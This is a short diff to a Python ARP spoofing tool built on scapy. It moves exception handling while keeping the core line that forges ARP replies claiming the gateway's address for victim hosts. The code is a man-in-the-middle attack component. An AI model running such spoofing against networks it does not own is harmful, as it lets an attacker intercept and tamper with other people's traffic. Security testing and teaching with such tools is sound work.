@@ -28,10 +28,7 @@ class ARPSpoofer:
     def spoof(self, target_ip, spoof_ip, target_mac):
         # Response ARP packet that send to the destination configured and tell them we have the router ip
         packet = scapy.ARP(op=2, hwdst=target_mac, pdst=target_ip, psrc=spoof_ip)
-        try:   
-            scapy.send(packet, verbose=False)
-        except OSError as e:
-            self.progress.emit(f"[-] {e}")
+        scapy.send(packet, verbose=False)
 
     def run(self):
         self.enable_ip_forwarding()
@@ -61,6 +58,8 @@ class ARPSpoofer:
                     self.progress.emit(
                         f"[-] Failed to obtain victim's MAC address ({victim_ip}), it might be caused by target not responding "
                         f"to ARP Request")
+                except OSError as e:
+                    self.progress.emit(f"[-] {e}")
         # Conclude results and restore IPTables rules
         for victim_ip in self.victim_ips:
             self.restore(victim_ip, self.gateway_ip)
